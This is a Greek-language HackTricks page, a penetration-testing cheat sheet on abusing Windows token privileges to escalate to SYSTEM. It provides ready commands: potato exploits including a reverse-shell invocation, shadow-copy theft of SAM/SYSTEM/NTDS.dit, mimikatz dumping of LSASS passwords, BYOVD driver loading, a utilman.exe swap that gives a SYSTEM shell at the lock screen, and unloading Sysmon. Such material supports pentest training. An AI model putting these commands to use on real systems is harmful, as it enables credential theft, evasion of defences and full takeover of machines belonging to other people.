# Κατάχρηση Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν ξέρεις τι είναι τα Windows Access Tokens** διάβασε αυτή τη σελίδα πριν συνεχίσεις:


{{#ref}}
access-tokens.md
{{#endref}}

**Ίσως να μπορείς να κάνεις escalate privileges καταχρώμενος τα tokens που ήδη έχεις**

### SeImpersonatePrivilege

Αυτό είναι privilege που κατέχεται από οποιαδήποτε process και επιτρέπει την impersonation (αλλά όχι creation) οποιουδήποτε token, εφόσον μπορεί να αποκτηθεί ένα handle σε αυτό. Ένα privileged token μπορεί να αποκτηθεί από μια Windows service (DCOM) κάνοντάς την να εκτελέσει NTLM authentication απέναντι σε ένα exploit, επιτρέποντας στη συνέχεια την εκτέλεση ενός process με SYSTEM privileges. Αυτή η vulnerability μπορεί να εκμεταλλευτεί χρησιμοποιώντας διάφορα tools, όπως [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (το οποίο απαιτεί το winrm να είναι disabled), [SweetPotato](https://github.com/CCob/SweetPotato), και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: σε Windows 10 1809+/Server 2019+, προτίμησε **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ή **PrintSpoofer** ανάλογα με το ποιο RPC/COM surface είναι ακόμα reachable.
- Αν compromised ένα service που τρέχει ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και το `whoami /priv` δείχνει ένα **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανάκτησε πρώτα το **default privilege set** του account (για παράδειγμα με **FullPowers**) και μετά ξαναδοκίμασε την οικογένεια potato.
- Κάποια νεότερα forks είναι πιο operator-friendly από τα αρχικά tools. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και modern Windows compatibility, ενώ το **PrintNotifyPotato** καταχράται το PrintNotify COM service και είναι συχνά χρήσιμο όταν το κλασικό Spooler path είναι disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege**, θα χρησιμοποιήσει την **ίδια μέθοδο** για να πάρει ένα privileged token.\
Στη συνέχεια, αυτό το privilege επιτρέπει **την ανάθεση ενός primary token** σε μια νέο/suspended process. Με το privileged impersonation token μπορείς να παράγεις ένα primary token (DuplicateTokenEx).\
Με το token, μπορείς να δημιουργήσεις μια **νέα process** με 'CreateProcessAsUser' ή να δημιουργήσεις μια process suspended και να **ορίσεις το token** (γενικά, δεν μπορείς να τροποποιήσεις το primary token ενός running process).

### SeTcbPrivilege

Αν έχεις ενεργοποιημένο αυτό το token μπορείς να χρησιμοποιήσεις **KERB_S4U_LOGON** για να πάρεις ένα **impersonation token** για οποιονδήποτε άλλο χρήστη χωρίς να γνωρίζεις τα credentials, **να προσθέσεις ένα arbitrary group** (admins) στο token, να ορίσεις το **integrity level** του token σε "**medium**", και να αναθέσεις αυτό το token στο **current thread** (SetThreadToken).

### SeBackupPrivilege

Το system αναγκάζεται να **παρέχει πλήρη read access** σε οποιοδήποτε file (περιορισμένο σε read operations) από αυτό το privilege. Χρησιμοποιείται για το **διάβασμα των password hashes τοπικών Administrator** accounts από το registry, μετά το οποίο μπορούν να χρησιμοποιηθούν tools όπως "**psexec**" ή "**wmiexec**" με το hash (Pass-the-Hash technique). Ωστόσο, αυτή η technique αποτυγχάνει υπό δύο συνθήκες: όταν το Local Administrator account είναι disabled, ή όταν υπάρχει policy που αφαιρεί administrative rights από Local Administrators που συνδέονται remotely.\
Στην πράξη, το πιο αξιόπιστο built-in workflow είναι συνήθως **VSS + `robocopy /b`**: δημιουργείς/εκθέτεις ένα shadow copy, και μετά αντιγράφεις `SAM`/`SYSTEM` ή `NTDS.dit` σε **backup mode**, το οποίο παρακάμπτει τα file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Μπορείς να **abuse this privilege** με:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- ακολουθώντας τον **IppSec** στο [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ή όπως εξηγείται στην ενότητα **escalating privileges with Backup Operators** του:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Η άδεια για **write access** σε οποιοδήποτε system file, ανεξάρτητα από το Access Control List (ACL) του αρχείου, παρέχεται από αυτό το privilege. Ανοίγει πολλές δυνατότητες για escalation, συμπεριλαμβανομένης της δυνατότητας να **modify services**, να κάνεις DLL Hijacking, και να ορίσεις **debuggers** μέσω Image File Execution Options, μεταξύ διαφόρων άλλων τεχνικών.

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό permission, ιδιαίτερα χρήσιμο όταν ένας χρήστης έχει τη δυνατότητα να impersonate tokens, αλλά και στην απουσία του SeImpersonatePrivilege. Αυτή η δυνατότητα βασίζεται στην ικανότητα να impersonate ένα token που αντιπροσωπεύει τον ίδιο χρήστη και του οποίου το integrity level δεν υπερβαίνει αυτό του τρέχοντος process.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Είναι δυνατό να αξιοποιηθεί το SeCreateTokenPrivilege για EoP με impersonating tokens υπό συγκεκριμένες συνθήκες.
- **Conditions for Token Impersonation:** Η επιτυχής impersonation απαιτεί το target token να ανήκει στον ίδιο χρήστη και να έχει integrity level μικρότερο ή ίσο με το integrity level του process που προσπαθεί να κάνει impersonation.
- **Creation and Modification of Impersonation Tokens:** Οι χρήστες μπορούν να δημιουργήσουν ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) ενός privileged group.

### SeLoadDriverPrivilege

Αυτό το privilege επιτρέπει να **load and unload device drivers** με τη δημιουργία μιας registry entry με συγκεκριμένες τιμές για `ImagePath` και `Type`. Επειδή η άμεση write access στο `HKLM` (HKEY_LOCAL_MACHINE) είναι περιορισμένη, πρέπει να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER). Ωστόσο, για να γίνει το `HKCU` αναγνωρίσιμο από τον kernel για τη ρύθμιση του driver, πρέπει να ακολουθηθεί μια συγκεκριμένη διαδρομή.

Η σύγχρονη offensive χρήση είναι συνήθως **BYOVD** (bring your own vulnerable driver): φορτώνεις έναν **signed but vulnerable** kernel driver και μετά χρησιμοποιείς τα IOCTLs του για να απενεργοποιήσεις protections ή να φτάσεις σε kernel code execution. Να έχεις υπόψη ότι σε πρόσφατα Windows 11/Server builds το **Microsoft vulnerable driver blocklist** και/ή το **HVCI/Memory Integrity** συχνά χαλάνε παλαιότερες public chains, οπότε τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον καθολικά αξιόπιστα.

Αυτό το path είναι `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, όπου `<RID>` είναι το Relative Identifier του τρέχοντος χρήστη. Μέσα στο `HKCU`, πρέπει να δημιουργηθεί ολόκληρο αυτό το path, και να οριστούν δύο τιμές:

- `ImagePath`, που είναι το path προς το binary που θα εκτελεστεί
- `Type`, με τιμή `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Πρόσβαση στο `HKCU` αντί για το `HKLM` λόγω περιορισμένης write access.
2. Δημιουργία του path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` μέσα στο `HKCU`, όπου το `<RID>` αντιπροσωπεύει το Relative Identifier του τρέχοντος χρήστη.
3. Ορισμός του `ImagePath` στο execution path του binary.
4. Ανάθεση του `Type` ως `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Περισσότεροι τρόποι να abuse αυτό το privilege στο [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε ένα process να **assume ownership of an object**, παρακάμπτοντας την απαίτηση για explicit discretionary access μέσω της παροχής WRITE_OWNER access rights. Η διαδικασία περιλαμβάνει πρώτα την εξασφάλιση ownership του επιθυμητού registry key για σκοπούς εγγραφής, και στη συνέχεια την τροποποίηση του DACL ώστε να ενεργοποιηθούν οι write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Αυτό το privilege επιτρέπει το **debug other processes**, συμπεριλαμβανομένης της ανάγνωσης και εγγραφής στη μνήμη. Με αυτό το privilege μπορούν να χρησιμοποιηθούν διάφορες στρατηγικές memory injection, ικανές να παρακάμπτουν τα περισσότερα antivirus και host intrusion prevention solutions.

Σε σύγχρονα Windows, να θυμάσαι ότι το `SeDebugPrivilege` συνήθως αρκεί για να ανοίξεις **non-protected SYSTEM processes** και να αντιγράψεις τα tokens τους, αλλά **δεν** εγγυάται ότι μπορείς να αγγίξεις το **LSASS**. Αν το **RunAsPPL / LSA Protection** είναι ενεργοποιημένο, τα non-protected processes δεν μπορούν να διαβάσουν ή να κάνουν inject στο LSASS ακόμη κι αν υπάρχει το `SeDebugPrivilege`. Σε αυτήν την περίπτωση, κλέψε ένα token από άλλο non-PPL SYSTEM process, ή συνδύασέ το με ένα PPL bypass/BYOVD αντί να υποθέτεις ότι το `procdump` θα δουλέψει. Για ένα πλήρες token-copy example χρησιμοποιώντας `SeDebugPrivilege` + `SeImpersonatePrivilege`, δες [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Θα μπορούσες να χρησιμοποιήσεις το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **capture the memory of a process**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στη διαδικασία **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, η οποία είναι υπεύθυνη για την αποθήκευση των credentials του χρήστη αφού ο χρήστης συνδεθεί επιτυχώς σε ένα σύστημα.

Στη συνέχεια μπορείς να φορτώσεις αυτό το dump στο mimikatz για να αποκτήσεις passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Αν θέλεις να αποκτήσεις ένα `NT SYSTEM` shell μπορείς να χρησιμοποιήσεις:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Αυτό το δικαίωμα (Perform volume maintenance tasks) επιτρέπει το άνοιγμα raw volume device handles (π.χ., \\.\C:) για direct disk I/O που παρακάμπτει τα NTFS ACLs. Με αυτό μπορείς να αντιγράψεις bytes οποιουδήποτε αρχείου στο volume διαβάζοντας τα underlying blocks, επιτρέποντας arbitrary file read ευαίσθητου υλικού (π.χ., machine private keys στο %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS μέσω VSS). Είναι ιδιαίτερα impactful σε CA servers, όπου το exfiltrating του CA private key επιτρέπει το forging ενός Golden Certificate για να impersonate οποιοδήποτε principal.

Δες detailed techniques και mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Τα **tokens που εμφανίζονται ως Disabled** συνήθως μπορούν να ενεργοποιηθούν, οπότε συχνά μπορείς να abuse τόσο τα _Enabled_ όσο και τα _Disabled_ privileges.

### Enable All the tokens

Αν έχεις disabled privileges, μπορείς να χρησιμοποιήσεις το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσεις όλα τα tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ή το **script** ενσωματωμένο σε αυτό το [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), η σύνοψη παρακάτω θα αναφέρει μόνο άμεσους τρόπους εκμετάλλευσης του privilege για να αποκτήσετε admin session ή να διαβάσετε ευαίσθητα αρχεία.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------ | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ τον [Aurélien Chalot](https://twitter.com/Defte_) για το update. Θα προσπαθήσω να το επαναδιατυπώσω σύντομα σε κάτι πιο recipe-like.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Διαβάστε ευαίσθητα αρχεία με `robocopy /b` ή με ειδικά SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Εξαιρετικό για `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, και μερικές φορές `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι πρακτικό, αλλά τα dedicated SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Δημιουργήστε arbitrary token, συμπεριλαμβανομένων τοπικών admin rights με `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token ή dump memory από non-protected process.                                                                                                                                                                                                                                                                 | <p>Το LSASS dumping συνήθως μπλοκάρεται αν είναι ενεργοποιημένο το RunAsPPL/LSA Protection.</p><p>Script θα βρείτε στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Χρησιμοποιήστε την οικογένεια **Potato** / named-pipe impersonation για να εκκινήσετε SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Πιο πρακτικό από service accounts όπως IIS APPPOOL, MSSQL, scheduled tasks, ή οποιοδήποτε context που ήδη έχει `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Φορτώστε έναν signed-but-vulnerable kernel driver (BYOVD)<br>2. Χρησιμοποιήστε τα IOCTLs του driver για να πάρετε kernel R/W, να απενεργοποιήσετε security tooling, ή να κάνετε elevate σε SYSTEM<br><br>Εναλλακτικά, το privilege μπορεί να χρησιμοποιηθεί για να unload security-related drivers με <code>fltMC</code> builtin command, δηλαδή <code>fltMC sysmondrv</code></p>                     | <p>Παλαιότεροι public drivers όπως ο <code>szkg64.sys</code> μπλοκάρονται ολοένα και περισσότερο σε σύγχρονο Windows από το vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Εκκινήστε PowerShell/ISE με το SeRestore privilege παρόν.<br>2. Ενεργοποιήστε το privilege με το <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονομάστε το utilman.exe σε utilman.old<br>4. Μετονομάστε το cmd.exe σε utilman.exe<br>5. Κλειδώστε την κονσόλα και πατήστε Win+U</p> | <p>Η επίθεση μπορεί να ανιχνευθεί από κάποιο AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που αποθηκεύονται στο "Program Files" χρησιμοποιώντας το ίδιο privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονομάστε το cmd.exe σε utilman.exe<br>4. Κλειδώστε την κονσόλα και πατήστε Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να ανιχνευθεί από κάποιο AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που αποθηκεύονται στο "Program Files" χρησιμοποιώντας το ίδιο privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
